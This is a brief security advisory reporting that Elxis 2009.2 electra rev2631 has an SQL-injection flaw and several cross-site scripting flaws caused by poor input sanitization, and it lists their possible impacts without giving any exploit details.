Elxis is prone to an SQL-injection vulnerability and multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied input.

Exploiting these vulnerabilities could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.

Elxis 2009.2 electra rev2631 is vulnerable; other versions may be affected.
